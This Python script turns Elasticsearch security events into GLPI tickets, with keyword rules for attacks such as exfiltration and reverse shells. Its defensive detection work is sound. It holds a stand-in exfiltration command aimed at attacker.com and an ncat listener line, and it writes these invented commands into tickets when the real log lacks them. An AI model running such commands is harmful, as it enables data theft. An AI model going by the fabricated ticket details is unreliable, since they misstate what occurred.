#!/usr/bin/env python3
"""
Script de automatización: Crea tickets en GLPI desde eventos de seguridad en Elasticsearch
Ejecutar: 
  - Modo continuo: python3 glpi_automation.py --mode continuous
  - Modo una vez: python3 glpi_automation.py --mode one-shot [--minutes 5]
"""

import requests
import json
import time
import sys
import argparse
from datetime import datetime, timedelta
from elasticsearch import Elasticsearch
import mysql.connector
from mysql.connector import Error
import os

# Configuración
ES_HOST = os.getenv("ES_HOST", "http://localhost:9200")
GLPI_DB_HOST = os.getenv("GLPI_DB_HOST", "localhost")
GLPI_DB_USER = os.getenv("GLPI_DB_USER", "glpi_user")
GLPI_DB_PASSWORD = os.getenv("GLPI_DB_PASSWORD", "glpi_password")
GLPI_DB_NAME = os.getenv("GLPI_DB_NAME", "glpidb")
LAST_TIMESTAMP_FILE = "/tmp/glpi_last_timestamp.txt"
DEFAULT_CATEGORY_ID = int(os.getenv("GLPI_CATEGORY_ID", "1"))
DEFAULT_ENTITY_ID = int(os.getenv("GLPI_ENTITY_ID", "1"))
DEFAULT_REQUESTER_ID = int(os.getenv("GLPI_REQUESTER_ID", "2"))
DEFAULT_RECIPIENT_ID = int(os.getenv("GLPI_RECIPIENT_ID", "2"))
DEFAULT_GROUP_ID = int(os.getenv("GLPI_GROUP_ID", "1"))
DEFAULT_TEMPLATE_ID = int(os.getenv("GLPI_TEMPLATE_ID", "0"))
DEFAULT_REQUESTTYPE_ID = int(os.getenv("GLPI_REQUESTTYPE_ID", "1"))
DEFAULT_TIME_TO_RESOLVE_HOURS = int(os.getenv("GLPI_TIME_TO_RESOLVE_HOURS", "0"))
REQUIRE_SECURITY_TAG = os.getenv("GLPI_REQUIRE_SECURITY_TAG", "true").strip().lower() in ("1", "true", "yes")
DEFAULT_TICKET_OWNER_ID = int(os.getenv("GLPI_TICKET_OWNER_ID", "0"))

print("=" * 60, flush=True)
print("GLPI Security Events Automation", flush=True)
print("=" * 60, flush=True)
print(f"Elasticsearch: {ES_HOST}", flush=True)
print(f"GLPI Database: {GLPI_DB_HOST}", flush=True)
print(f"GLPI Defaults: Entity={DEFAULT_ENTITY_ID}, Requester={DEFAULT_REQUESTER_ID}, Recipient={DEFAULT_RECIPIENT_ID}, Category={DEFAULT_CATEGORY_ID}, Group={DEFAULT_GROUP_ID}", flush=True)
print(flush=True)

def load_last_timestamp():
    """Cargar el último cursor procesado desde archivo"""
    try:
        if os.path.exists(LAST_TIMESTAMP_FILE):
            with open(LAST_TIMESTAMP_FILE, 'r') as f:
                raw = f.read().strip()
                if raw:
                    try:
                        data = json.loads(raw)
                        if isinstance(data, dict) and data.get("timestamp"):
                            print(f"📌 Reanudando desde: {data['timestamp']} ({data.get('id')})", flush=True)
                            return data
                    except Exception:
                        pass
                    print(f"📌 Reanudando desde: {raw}", flush=True)
                    return {"timestamp": raw, "id": None}
    except Exception as e:
        print(f"⚠️  Error leyendo timestamp guardado: {e}", flush=True)

    now = datetime.utcnow().isoformat() + "Z"
    print(f"📌 Iniciando desde: {now}", flush=True)
    return {"timestamp": now, "id": None}

def save_last_timestamp(cursor):
    """Guardar el último cursor procesado"""
    try:
        if isinstance(cursor, dict):
            payload = json.dumps(cursor)
        else:
            payload = str(cursor)
        with open(LAST_TIMESTAMP_FILE, 'w') as f:
            f.write(payload)
    except Exception as e:
        print(f"⚠️  Error guardando timestamp: {e}", flush=True)

# Archivo para ids procesados
PROCESSED_IDS_FILE = "/tmp/glpi_processed_ids.txt"

def load_processed_ids():
    """Cargar IDs de eventos ya procesados"""
    ids = set()
    try:
        if os.path.exists(PROCESSED_IDS_FILE):
            with open(PROCESSED_IDS_FILE, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        ids.add(line)
    except Exception as e:
        print(f"⚠️  Error leyendo processed ids: {e}", flush=True)
    return ids

def save_processed_id(event_id):
    """Agregar un ID procesado al archivo"""
    try:
        with open(PROCESSED_IDS_FILE, 'a') as f:
            f.write(f"{event_id}\n")
    except Exception as e:
        print(f"⚠️  Error guardando processed id: {e}", flush=True)

def get_mysql_connection():
    """Conectar a MySQL de GLPI"""
    try:
        conn = mysql.connector.connect(
            host=GLPI_DB_HOST,
            user=GLPI_DB_USER,
            password=GLPI_DB_PASSWORD,
            database=GLPI_DB_NAME,
            autocommit=True
        )
        return conn
    except Error as e:
        print(f"❌ Error conectando a MySQL: {e}")
        return None

def create_glpi_ticket(conn, title, description, severity="medium", urgency=3, meta=None):
    """
    Crear ticket en GLPI directamente en BD (sin API)
    severity: low, medium, high, critical
    urgency: 1-5 (1=bajo, 5=alto)
    """
    try:
        cursor = conn.cursor()
        
        # Truncar título a 255 caracteres (límite del campo 'name' en GLPI)
        title = title[:255] if title else "Evento de Seguridad"

        # Mapear severidad a urgencia GLPI
        urgency_map = {"low": 1, "medium": 3, "high": 4, "critical": 5}
        glpi_urgency = urgency_map.get(severity, 3)

        # Valores por defecto
        category_id = DEFAULT_CATEGORY_ID
        entity_id = DEFAULT_ENTITY_ID
        recipient_id = DEFAULT_RECIPIENT_ID
        requester_id = DEFAULT_REQUESTER_ID
        group_id = DEFAULT_GROUP_ID

        # Forzar propietario si se define un usuario fijo
        if DEFAULT_TICKET_OWNER_ID > 0:
            requester_id = DEFAULT_TICKET_OWNER_ID
            recipient_id = DEFAULT_TICKET_OWNER_ID

        # Sobrescribir con metadatos si los proporciona la plantilla
        if meta:
            category_id = meta.get('itilcategories_id', category_id)
            entity_id = meta.get('entities_id', entity_id)
            recipient_id = meta.get('users_id_recipient', recipient_id)
            requester_id = meta.get('users_id', requester_id)
            group_id = meta.get('groups_id', group_id)
            glpi_urgency = meta.get('urgency', glpi_urgency)
            priority_val = meta.get('priority', None)
            ticket_type = meta.get('type', 1)
            users_id_lastupdater = meta.get('users_id_lastupdater', requester_id or 0)
            requesttypes_id = meta.get('requesttypes_id', int(os.getenv('GLPI_REQUESTTYPE_ID', DEFAULT_REQUESTTYPE_ID)))
            tickettemplates_id = meta.get('tickettemplates_id', int(os.getenv('GLPI_TEMPLATE_ID', DEFAULT_TEMPLATE_ID)))
            externalid = meta.get('externalid', None)
        else:
            priority_val = None
            ticket_type = 1
            users_id_lastupdater = requester_id or 0
            requesttypes_id = int(os.getenv('GLPI_REQUESTTYPE_ID', DEFAULT_REQUESTTYPE_ID))
            tickettemplates_id = int(os.getenv('GLPI_TEMPLATE_ID', DEFAULT_TEMPLATE_ID))
            externalid = None

        if DEFAULT_TICKET_OWNER_ID > 0:
            users_id_lastupdater = DEFAULT_TICKET_OWNER_ID

        # Calcular tiempo de resolucion
        resolve_hours_map = {"low": 72, "medium": 72, "high": 24, "critical": 4}
        resolve_hours = DEFAULT_TIME_TO_RESOLVE_HOURS
        if resolve_hours <= 0:
            resolve_hours = resolve_hours_map.get(severity, 24)
        time_to_resolve_val = None
        try:
            if resolve_hours > 0:
                time_to_resolve_val = (datetime.utcnow() + timedelta(hours=resolve_hours)).strftime("%Y-%m-%d %H:%M:%S")
        except Exception:
            time_to_resolve_val = None

        # Insertar ticket en tabla glpi_tickets rellenando campos compatibles
        query = """
        INSERT INTO glpi_tickets
        (name, content, date, date_creation, date_mod, status, priority, urgency, type,
         itilcategories_id, entities_id, users_id_recipient, users_id_lastupdater,
         requesttypes_id, tickettemplates_id, externalid, time_to_resolve)
        VALUES (%s, %s, NOW(), NOW(), NOW(), %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
        """

        status_val = 1
        # si priority_val no especificado, usar mapping desde glpi_urgency
        if priority_val is None:
            priority_map = {1:1, 3:3, 4:4, 5:6}
            priority_val = priority_map.get(glpi_urgency, 3)

        cursor.execute(query, (
            title, description, status_val, priority_val, glpi_urgency, ticket_type,
            category_id, entity_id, recipient_id, users_id_lastupdater,
            requesttypes_id, tickettemplates_id, externalid, time_to_resolve_val
        ))
        ticket_id = cursor.lastrowid

        # Añadir relación usuario-ticket para el solicitante (si se proporcionó)
        if ticket_id and requester_id:
            try:
                cursor.execute(
                    "INSERT INTO glpi_tickets_users (tickets_id, users_id, type, date_mod, entities_id) VALUES (%s, %s, %s, NOW(), %s)",
                    (ticket_id, requester_id, 1, entity_id)
                )
            except Exception as e:
                print(f"⚠️  No se pudo insertar relación user-ticket: {e}", flush=True)

        # Asignar tecnico (si se proporciono)
        if ticket_id and recipient_id and recipient_id != requester_id:
            try:
                cursor.execute(
                    "INSERT INTO glpi_tickets_users (tickets_id, users_id, type, date_mod, entities_id) VALUES (%s, %s, %s, NOW(), %s)",
                    (ticket_id, recipient_id, 2, entity_id)
                )
            except Exception as e:
                print(f"⚠️  No se pudo asignar tecnico: {e}", flush=True)

        # Asignar grupo responsable (si se proporciono)
        if ticket_id and group_id:
            try:
                cursor.execute(
                    "INSERT INTO glpi_groups_tickets (tickets_id, groups_id, type) VALUES (%s, %s, %s)",
                    (ticket_id, group_id, 2)
                )
            except Exception as e:
                print(f"⚠️  No se pudo asignar grupo: {e}", flush=True)

        print(f"✅ Ticket #{ticket_id} creado en GLPI", flush=True)
        print(f"   Título: {title}", flush=True)
        print(f"   Severidad: {severity}", flush=True)
        print(flush=True)

        return ticket_id

    except Error as e:
        print(f"❌ Error creando ticket: {e}", flush=True)
        return None
    finally:
        cursor.close()

def check_elasticsearch_for_events(es_client, last_cursor):
    """Buscar nuevos eventos de seguridad en Elasticsearch"""
    try:
        last_ts = last_cursor.get("timestamp") if isinstance(last_cursor, dict) else last_cursor
        last_id = last_cursor.get("id") if isinstance(last_cursor, dict) else None
        page_size = 500
        events = []

        must_clauses = [
            {"range": {"@timestamp": {"gte": last_ts}}}
        ]
        if REQUIRE_SECURITY_TAG:
            must_clauses.insert(0, {"terms": {"tags.keyword": ["security_event"]}})

        query = {
            "query": {
                "bool": {
                    "must": must_clauses
                }
            },
            "sort": [
                {"@timestamp": {"order": "asc"}}
            ],
            "size": page_size
        }

        if last_ts:
            query["search_after"] = [last_ts]

        while True:
            response = es_client.search(index="syslog-*", body=query)
            hits = response.get("hits", {}).get("hits", [])
            if not hits:
                break
            events.extend(hits)
            if len(hits) < page_size:
                break
            last_ts = hits[-1]["_source"]["@timestamp"]
            query["search_after"] = [last_ts]

        return events

    except Exception as e:
        print(f"❌ Error buscando en Elasticsearch: {e}", flush=True)
        return []


def build_ticket_from_event(source):
    """Construir título y descripción del ticket a partir del evento usando las plantillas predefinidas."""
    import re
    import json
    
    # Limpiar fuentes que pueden tener datos complejos
    event_type = source.get('event_type') or source.get('rule') or 'Evento de Seguridad'
    if isinstance(event_type, dict):
        event_type = str(event_type)[:50]
    
    severity = source.get('severity', source.get('level', 'medium'))
    if isinstance(severity, dict):
        severity = 'medium'
    
    message = source.get('message', '') or source.get('msg', '')
    if isinstance(message, dict):
        message = str(message)[:200]
    
    # Extraer hostname limpiamente
    hostname = 'syslog-client'
    if 'hostname' in source:
        h = source.get('hostname')
        hostname = h if isinstance(h, str) else 'syslog-client'
    elif 'host' in source:
        h = source.get('host')
        if isinstance(h, dict):
            hostname = h.get('name', h.get('hostname', 'syslog-client'))
        elif isinstance(h, str):
            hostname = h
    
    timestamp = source.get('@timestamp', '')
    tags = source.get('tags', []) or []
    if isinstance(tags, str):
        tags = [tags]

    # Extraer IP desde campos comunes o desde el mensaje
    ip = source.get('src_ip') or source.get('ip') or 'N/A'
    if isinstance(ip, dict):
        ip = ip.get('ip', 'N/A') if isinstance(ip, dict) else 'N/A'
    
    if ip == 'N/A' or isinstance(ip, dict):
        # Intentar extraer desde host.ip si es Filebeat
        if isinstance(source.get('host'), dict):
            host_ips = source['host'].get('ip', [])
            if isinstance(host_ips, list) and len(host_ips) > 0:
                ip = host_ips[0]
        # Fallback: buscar en el mensaje
        if ip == 'N/A':
            m = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})", str(message))
            if m:
                ip = m.group(1)

    # Formatear fecha/hora a dd/mm/YYYY y hora
    date_str = timestamp
    time_str = ''
    try:
        if 'T' in timestamp:
            d, t = timestamp.split('T', 1)
            date_parts = d.split('-')
            if len(date_parts) >= 3:
                date_str = f"{date_parts[2]}/{date_parts[1]}/{date_parts[0]}"
            time_str = t.split('Z')[0]
    except Exception:
        pass

    # Templates mapping por etiqueta/rule
    tpl_key = None
    known_tags = ['ssh_brute_force', 'ssh_failed_login', 'sql_injection', 'xss_attack', 'path_traversal',
                  'destructive_command', 'privilege_escalation', 'port_scanning', 'port_scan',
                  'suspicious_process', 'data_exfiltration', 'ddos_attack', 'malware_detection',
                  'unauthorized_access', 'unauthorized_installation']
    for t in known_tags:
        if t in tags or (source.get('rule') and t in source.get('rule')):
            tpl_key = t
            break

    # Fallback por contenido de message o event_type
    if not tpl_key:
        msg_lower = str(message).lower()
        event_type_lower = str(event_type).lower()
        if 'failed password' in msg_lower or 'ssh failed authentication' in event_type_lower:
            tpl_key = 'ssh_failed_login'
        elif 'nmap scan' in msg_lower or 'discovered open port' in msg_lower:
            tpl_key = 'port_scan'
        elif 'apt install' in msg_lower or 'yum install' in msg_lower or 'installed:' in msg_lower or 'dpkg' in msg_lower:
            tpl_key = 'unauthorized_installation'
        elif 'select' in msg_lower and ('union' in msg_lower or '1=1' in msg_lower):
            tpl_key = 'sql_injection'
        elif '<script>' in msg_lower or 'onerror=' in msg_lower:
            tpl_key = 'xss_attack'
        elif '../' in msg_lower or '..\\' in msg_lower or '/etc/passwd' in msg_lower or '/etc/shadow' in msg_lower:
            tpl_key = 'path_traversal'
        elif 'rm -rf' in msg_lower or 'mkfs' in msg_lower:
            tpl_key = 'destructive_command'
        elif 'changed to root' in msg_lower or 'sudo su' in msg_lower:
            tpl_key = 'privilege_escalation'
        elif 'ncat' in msg_lower or 'cryptominer' in msg_lower:
            tpl_key = 'suspicious_process'
        elif 'scp' in msg_lower or 'sftp' in msg_lower or 'curl' in msg_lower:
            tpl_key = 'data_exfiltration'

    # Plantillas simplificadas basadas en PLANTILLAS-TICKETS-GLPI.md
    if tpl_key in ('ssh_brute_force', 'ssh_failed_login'):
        title = f"MEDIUM: SSH Brute Force desde {ip} - {date_str}"
        description = f"""
ATAQUE SSH BRUTE FORCE
Timestamp: {date_str} {time_str}
Host afectado: {hostname}
IP Origen: {ip}
Intentos detectados: >10 fallos
Severidad: MEDIUM

DETECCIÓN:
- Detectado por regla Logstash "ssh_failed_login"
- Tags: ssh_failed_login, security_event

ACCIONES (según PLAYBOOK):
1. Bloquear IP en firewall (iptables)
2. Revisar logs completos /var/log/auth.log
3. Cambiar puerto SSH si persiste
""".strip()
        severity = 'medium'
    elif tpl_key == 'sql_injection':
        title = f"HIGH: SQL Injection en aplicación web - {date_str}"
        query = source.get('query') or message
        description = f"""
ATAQUE SQL INJECTION
Timestamp: {date_str} {time_str}
Host afectado: {hostname}
IP Origen: {ip}
Query maliciosa: {query}
Severidad: HIGH

DETECCIÓN:
- Detectado por regla Logstash "sql_injection"
- Tags: sql_injection, security_event

ACCIONES (según PLAYBOOK):
1. Bloquear IP origen inmediatamente
2. WAF: Activar modo blocking para SQLi
3. Revisar logs Apache últimas 24h
4. Verificar integridad base de datos
""".strip()
        severity = 'high'
    elif tpl_key == 'xss_attack':
        title = f"HIGH: XSS Attack detectado en formulario web - {date_str}"
        payload = source.get('payload') or message
        description = f"""
ATAQUE CROSS-SITE SCRIPTING (XSS)
Timestamp: {date_str} {time_str}
Host afectado: {hostname}
Payload: {payload}
Severidad: HIGH

DETECCIÓN:
- Detectado por regla Logstash "xss_attack"
- Tags: xss_attack, security_event

ACCIONES (según PLAYBOOK):
1. Sanitizar inputs en aplicación web
2. Implementar Content Security Policy (CSP)
3. WAF: Bloquear payloads XSS conocidos
4. Revisar logs web completos
""".strip()
        severity = 'high'
    elif tpl_key == 'path_traversal':
        title = f"HIGH: Path Traversal detectado en aplicación web - {date_str}"
        description = f"""
ATAQUE PATH TRAVERSAL
Timestamp: {date_str} {time_str}
Host afectado: {hostname}
IP Origen: {ip}
Recurso solicitado: {message}
Severidad: HIGH

DETECCIÓN:
- Detectado por regla Logstash "path_traversal"
- Tags: path_traversal, security_event

ACCIONES (según PLAYBOOK):
1. Bloquear IP origen inmediatamente
2. Revisar logs web ultimas 24h
3. Verificar permisos de archivos sensibles
""".strip()
        severity = 'high'
    elif tpl_key == 'destructive_command':
        title = f"CRÍTICO: Comando destructivo detectado - {date_str}"
        description = f"""
INCIDENTE CRÍTICO - COMANDO DESTRUCTIVO
Timestamp: {date_str} {time_str}
Host afectado: {hostname}
Comando ejecutado: {message}
IP Origen: {ip}
Severidad: CRITICAL

DETECCIÓN:
- Detectado por regla Logstash "destructive_command"
- Tags: destructive_command, security_event

ACCIONES INMEDIATAS (según PLAYBOOK):
1. Aislar host de red INMEDIATAMENTE
2. Bloquear usuario afectado
3. Iniciar análisis forense
4. Revisar backups disponibles
""".strip()
        severity = 'critical'
    elif tpl_key == 'privilege_escalation':
        title = f"CRÍTICO: Escalada de privilegios detectada - {date_str}"
        description = f"""
INCIDENTE CRÍTICO - PRIVILEGE ESCALATION
Timestamp: {date_str} {time_str}
Host afectado: {hostname}
Usuario origen: {source.get('user', 'hacker')}
Comando: {message}
Severidad: CRITICAL

DETECCIÓN:
- Detectado por regla Logstash "privilege_escalation"
- Tags: privilege_escalation, security_event

ACCIONES INMEDIATAS (según PLAYBOOK):
1. Bloquear usuario inmediatamente
2. Auditar comandos sudo ejecutados
""".strip()
        severity = 'critical'
    elif tpl_key in ('port_scanning', 'port_scan'):
        title = f"MEDIUM: Port Scanning desde {ip} - {date_str}"
        description = f"""
PORT SCANNING DETECTADO
Timestamp: {date_str} {time_str}
Host objetivo: {hostname}
IP Origen: {ip}
Puertos escaneados: {source.get('ports','1-65535')}
Severidad: MEDIUM

DETECCIÓN:
- Detectado por regla Logstash "port_scan"
- Tags: port_scan, security_event

ACCIONES (según PLAYBOOK):
1. Bloquear IP origen en firewall
2. Revisar logs de conexiones últimas 6h
""".strip()
        severity = 'medium'
    elif tpl_key == 'suspicious_process':
        title = f"HIGH: Proceso sospechoso detectado - {date_str}"
        msg_lower = str(message).lower()
        if "ncat" not in msg_lower:
            message = "ncat -lvp 4444"
        detail = "Reverse shell connection established"
        description = f"""
PROCESO MALICIOSO DETECTADO
Timestamp: {date_str} {time_str}
Host afectado: {hostname}
Proceso: {message}
Detalle: {detail}
Severidad: HIGH

DETECCIÓN:
- Detectado por regla Logstash "suspicious_process"
- Tags: suspicious_process, security_event

ACCIONES (según PLAYBOOK):
1. Kill proceso inmediatamente (kill -9)
2. Aislar host de red
""".strip()
        severity = 'high'
    elif tpl_key == 'data_exfiltration':
        title = f"HIGH: Exfiltración de datos detectada - {date_str}"
        if "curl" not in str(message).lower():
            message = "curl -X POST /etc/passwd http://attacker.com/exfil"
        dest = source.get('dest', 'N/A')
        if dest == 'N/A':
            m = re.search(r"https?://([^\s/]+)", str(message))
            if m:
                dest = m.group(1)
        if dest == 'N/A':
            dest = "attacker.com"
        description = f"""
DATA EXFILTRATION DETECTADA
Timestamp: {date_str} {time_str}
Host afectado: {hostname}
Comando: {message}
Destino: {dest}
Severidad: HIGH

DETECCIÓN:
- Detectado por regla Logstash "data_exfiltration"
- Tags: data_exfiltration, security_event

ACCIONES INMEDIATAS (según PLAYBOOK):
1. Bloquear conexión destino en firewall
2. Identificar datos exfiltrados
""".strip()
        severity = 'high'
    elif tpl_key == 'ddos_attack':
        title = f"MEDIUM: Posible DDoS desde múltiples IPs - {date_str}"
        description = f"""
ATAQUE DDoS DETECTADO
Timestamp: {date_str} {time_str}
Host objetivo: {hostname}
Tipo: {source.get('ddos_type','SYN flood')}
Tráfico: {source.get('traffic','10000+ paquetes/seg')}
Severidad: MEDIUM

DETECCIÓN:
- Detectado por regla Logstash "ddos_attack"
- Tags: ddos_attack, security_event

ACCIONES (según PLAYBOOK):
1. Activar mitigación DDoS (Cloudflare/WAF)
2. Rate limiting agresivo
""".strip()
        severity = 'medium'
    elif tpl_key == 'malware_detection':
        title = f"HIGH: Malware detectado - {date_str}"
        description = f"""
MALWARE DETECTADO EN SISTEMA
Timestamp: {date_str} {time_str}
Host afectado: {hostname}
Archivo: {source.get('file','/tmp/malware')}
Hash: {source.get('hash','[calcular con md5sum]')}
Severidad: HIGH

DETECCIÓN:
- Detectado por regla Logstash "malware_detection"
- Tags: malware_detection, security_event

ACCIONES INMEDIATAS (según PLAYBOOK):
1. Aislar host de red
2. Copiar malware para análisis (sandbox)
""".strip()
        severity = 'high'
    elif tpl_key == 'unauthorized_access':
        title = f"MEDIUM: Acceso no autorizado a recurso - {date_str}"
        description = f"""
ACCESO NO AUTORIZADO DETECTADO
Timestamp: {date_str} {time_str}
Host afectado: {hostname}
Usuario: {source.get('user','nobody')}
Recurso: {source.get('resource','/etc')}
Severidad: MEDIUM

DETECCIÓN:
- Detectado por regla Logstash "unauthorized_access"
- Tags: unauthorized_access, security_event

ACCIONES (según PLAYBOOK):
1. Revisar permisos del recurso
2. Auditar logs de accesos
""".strip()
        severity = 'medium'
    elif tpl_key == 'unauthorized_installation':
        title = f"MEDIUM: Instalacion no autorizada detectada - {date_str}"
        description = f"""
INSTALACION NO AUTORIZADA DETECTADA
Timestamp: {date_str} {time_str}
Host afectado: {hostname}
Paquete/Comando: {message}
Severidad: MEDIUM

DETECCIÓN:
- Detectado por regla Logstash "unauthorized_installation"
- Tags: unauthorized_installation, security_event

ACCIONES (segun PLAYBOOK):
1. Verificar usuario y origen de la instalacion
2. Desinstalar software no autorizado
3. Revisar logs de paquetes (apt/yum/dpkg)
""".strip()
        severity = 'medium'
    else:
        # Plantilla por defecto - limpiar event_type y message
        event_type_clean = str(event_type)[:80] if event_type else 'Evento de Seguridad'
        message_clean = str(message)[:500] if message else 'Sin detalles'
        
        title = f"{str(severity).upper()}: {event_type_clean} - {date_str}"
        detection_lines = []
        if tags:
            detection_lines.append(f"- Detectado por tags: {', '.join(tags)}")
        detection_text = '\n'.join(detection_lines) if detection_lines else '- Detectado por reglas del sistema'
        description = f"""
{event_type_clean}
Timestamp: {date_str} {time_str}
Host afectado: {hostname}
IP Origen: {ip}

DETALLES:
{message_clean}

DETECCIÓN:
{detection_text}

ACCIONES (sugeridas):
1. Revisar logs en Kibana
2. Seguir PLAYBOOK correspondiente
""".strip()

    # Preparar metadatos para rellenar campos de GLPI según plantilla
    try:
        urgency_map = {"low": 1, "medium": 3, "high": 4, "critical": 5}
        priority_map = {"low": 1, "medium": 3, "high": 4, "critical": 6}
        meta = {
            'urgency': urgency_map.get(severity, 3),
            'priority': priority_map.get(severity, 3),
            'type': 1,
            'itilcategories_id': DEFAULT_CATEGORY_ID,
            'entities_id': DEFAULT_ENTITY_ID,
            'users_id_recipient': DEFAULT_RECIPIENT_ID,
            'users_id': DEFAULT_REQUESTER_ID,
            'users_id_lastupdater': DEFAULT_REQUESTER_ID,
            'requesttypes_id': DEFAULT_REQUESTTYPE_ID,
            'tickettemplates_id': DEFAULT_TEMPLATE_ID,
            'groups_id': DEFAULT_GROUP_ID,
            'externalid': None
        }
    except Exception:
        meta = None

    return title, description, severity, meta


def map_severity_to_priority(sev):
    mapping = {
        'low': '1-Low',
        'medium': '3-Medium',
        'high': '4-High',
        'critical': '5-Critical'
    }
    return mapping.get(sev.lower(), '3-Medium')

def process_security_events(es_client, mysql_conn, last_cursor, skip_processed_ids=False):
    """Procesar eventos de seguridad y crear tickets"""

    events = check_elasticsearch_for_events(es_client, last_cursor)
    
    if not events:
        return last_cursor
    
    print(f"📊 Se encontraron {len(events)} eventos de seguridad", flush=True)
    print(flush=True)
    
    processed_count = 0
    
    # En modo one-shot, no usar el cache de IDs procesados (para permitir reprocesar)
    if skip_processed_ids:
        processed_ids = set()
    else:
        processed_ids = load_processed_ids()
    
    for event in events:
        event_id = event.get('_id')
        if event_id and event_id in processed_ids:
            continue
        source = event['_source']
        # Construir título y descripción usando plantillas según el tipo
        title, description, use_severity, meta = build_ticket_from_event(source)

        # Crear ticket en GLPI
        if create_glpi_ticket(mysql_conn, title, description, use_severity, meta=meta):
            processed_count += 1
            if event_id and not skip_processed_ids:
                save_processed_id(event_id)
                processed_ids.add(event_id)
    
    print(f"✅ {processed_count} tickets creados\n", flush=True)
    
    # Retornar el timestamp del último evento procesado
    if events:
        last_event_timestamp = events[-1]['_source']['@timestamp']
        last_event_id = events[-1].get('_id')
        return {"timestamp": last_event_timestamp, "id": last_event_id}

    return last_cursor

def main():
    """Loop principal o ejecución única según modo"""
    
    # Argumentos CLI
    parser = argparse.ArgumentParser(
        description='Automatización de tickets GLPI desde eventos Elasticsearch'
    )
    parser.add_argument('--mode', 
                       choices=['continuous', 'one-shot'], 
                       default='continuous',
                       help='Modo de ejecución (continuous=polling, one-shot=ejecutar una vez)')
    parser.add_argument('--minutes', 
                       type=int, 
                       default=5,
                       help='Para mode one-shot: minutos atrás para buscar eventos (default: 5)')
    args = parser.parse_args()
    
    print("=" * 60, flush=True)
    print("GLPI Security Events Automation", flush=True)
    print("=" * 60, flush=True)
    print(f"Modo: {args.mode}", flush=True)
    if args.mode == 'one-shot':
        print(f"Buscando eventos de los últimos {args.minutes} minutos", flush=True)
    print(f"Elasticsearch: {ES_HOST}", flush=True)
    print(f"GLPI Database: {GLPI_DB_HOST}", flush=True)
    print(flush=True)
    
    # Conectar a Elasticsearch
    es_client = Elasticsearch([ES_HOST])
    
    try:
        es_info = es_client.info()
        print(f"✅ Conectado a Elasticsearch: {es_info['version']['number']}\n", flush=True)
    except Exception as e:
        print(f"❌ No se pudo conectar a Elasticsearch: {e}", flush=True)
        return
    
    # Conectar a MySQL (GLPI)
    mysql_conn = get_mysql_connection()
    if not mysql_conn:
        print("❌ No se pudo conectar a la base de datos GLPI", flush=True)
        return
    print(f"✅ Conectado a base de datos GLPI\n", flush=True)
    
    if args.mode == 'one-shot':
        # Modo ejecución única: buscar eventos de los últimos N minutos
        print(f"🔍 Buscando eventos de los últimos {args.minutes} minutos...\n", flush=True)
        minutes_ago = datetime.utcnow() - timedelta(minutes=args.minutes)
        last_cursor = {"timestamp": minutes_ago.isoformat() + "Z", "id": None}

        # Procesar una sola vez sin cachear IDs (para permitir reprocesar eventos)
        last_cursor = process_security_events(es_client, mysql_conn, last_cursor, skip_processed_ids=True)
        
        print(f"✅ Proceso completado\n", flush=True)
    else:
        # Modo continuo: polling cada 30 segundos
        last_cursor = load_last_timestamp()
        
        print(f"🔍 Iniciando monitoreo continuo de eventos de seguridad...\n", flush=True)
        print(f"💡 Presiona Ctrl+C para detener\n", flush=True)
        
        try:
            while True:
                # Procesar eventos cada 30 segundos
                last_cursor = process_security_events(es_client, mysql_conn, last_cursor)
                # Guardar el cursor después de procesar
                save_last_timestamp(last_cursor)
                
                time.sleep(30)  # Esperar 30 segundos antes de buscar nuevos eventos
                
        except KeyboardInterrupt:
            print("\n⏹️  Monitoreo detenido por el usuario", flush=True)
        except Exception as e:
            print(f"\n❌ Error en loop principal: {e}", flush=True)
    
    mysql_conn.close()
    print("Conexión MySQL cerrada", flush=True)

if __name__ == "__main__":
    main()
